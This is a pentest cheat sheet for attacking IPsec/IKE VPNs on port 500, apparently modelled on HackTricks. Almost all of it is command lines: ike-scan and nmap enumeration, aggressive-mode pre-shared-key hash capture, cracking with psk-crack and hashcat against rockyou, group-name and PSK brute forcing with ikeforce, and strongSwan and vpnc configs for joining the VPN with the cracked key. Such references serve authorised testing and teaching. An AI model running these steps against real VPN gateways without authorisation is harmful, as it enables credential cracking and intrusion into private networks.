# Port 500 - IPsec/IKE VPN

## Table of Contents

- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Brute Force](#brute-force)

---

## Enumeration

### Quick Check (One-liner)

```shell
ike-scan -A $rhost && nmap -sU -p 500 --script "ike-version" $rhost
```

### Nmap Scripts

```shell
nmap -sU -sV -p500 $rhost
nmap -sU -p500 --script "ike-version" $rhost
```

### ike-scan

```shell
# Install
apt install ike-scan

# Basic scan
ike-scan $rhost

# Aggressive mode (reveals group name)
ike-scan -A $rhost

# Main mode
ike-scan -M $rhost

# Verbose scan with all transforms
ike-scan -v -v $rhost

# Scan multiple hosts
ike-scan -f hosts.txt
```

### Identify IKE Version

```shell
# IKEv1
ike-scan $rhost

# IKEv2
ike-scan --ikev2 $rhost
```

### Transform Enumeration

```shell
# Test specific encryption
ike-scan --trans=5,2,1,2 $rhost  # 3DES, SHA1, PSK, DH2

# Common transforms
ike-scan --trans=7,2,1,2 $rhost  # AES128, SHA1, PSK, DH2
ike-scan --trans=7/256,2,1,2 $rhost  # AES256, SHA1, PSK, DH2
```

---

## Exploitation

### PSK Cracking (Aggressive Mode)

> Aggressive mode reveals pre-shared key hash

```shell
# Capture PSK hash
ike-scan -A -P $rhost > ike_hash.txt

# Crack with psk-crack
psk-crack -d /usr/share/wordlists/rockyou.txt ike_hash.txt

# Crack with hashcat
# Mode 5300 = IKE MD5, 5400 = IKE SHA1
hashcat -m 5400 ike_hash.txt /usr/share/wordlists/rockyou.txt
```

### Group Name Enumeration

```shell
# Try common group names
for group in vpn cisco admin test company; do
  ike-scan -A -n $group $rhost
done

# Custom wordlist
ike-scan -A -n groupname $rhost
```

### IKE Aggressive Mode Attack

```shell
# 1. Get hash with ike-scan
ike-scan -A -P -i eth0 -n vpngroup $rhost

# 2. Convert to hashcat format
# IKE hash format for hashcat

# 3. Crack offline
hashcat -m 5400 hash.txt wordlist.txt
```

---

## Brute Force

### ikeforce

```shell
# https://github.com/SpiderLabs/ikeforce

# Install
git clone https://github.com/SpiderLabs/ikeforce.git
cd ikeforce
pip install -r requirements.txt

# Enumerate group names
python ikeforce.py $rhost -e -w /usr/share/wordlists/groupnames.txt

# Brute force PSK
python ikeforce.py $rhost -b -i groupname -w /usr/share/wordlists/rockyou.txt
```

### Custom Wordlist for VPN

```shell
# Common VPN group names
cat > vpn_groups.txt << EOF
vpn
cisco
asa
admin
company
remote
mobile
partner
employee
EOF
```

---

## Connect to VPN

### strongSwan

```shell
# Install
apt install strongswan

# Configure /etc/ipsec.conf
conn target
  type=tunnel
  keyexchange=ikev1
  authby=secret
  left=%defaultroute
  leftid=@myid
  right=$rhost
  rightid=@vpngateway
  ike=3des-sha1-modp1024
  esp=3des-sha1
  auto=start

# Configure /etc/ipsec.secrets
@myid @vpngateway : PSK "password"

# Start connection
ipsec restart
ipsec up target
```

### vpnc (Cisco)

```shell
apt install vpnc

# Configure /etc/vpnc/default.conf
IPSec gateway $rhost
IPSec ID groupname
IPSec secret grouppassword
Xauth username user
Xauth password pass

# Connect
vpnc
```

---

## Tools

- ike-scan: https://github.com/royhills/ike-scan
- ikeforce: https://github.com/SpiderLabs/ikeforce
- strongSwan: https://strongswan.org/
- vpnc: https://www.unix-ag.uni-kl.de/~massar/vpnc/

---

## References

- [HackTricks - IPsec/IKE](https://book.hacktricks.wiki/network-services-pentesting/ipsec-ike-vpn-pentesting.html)
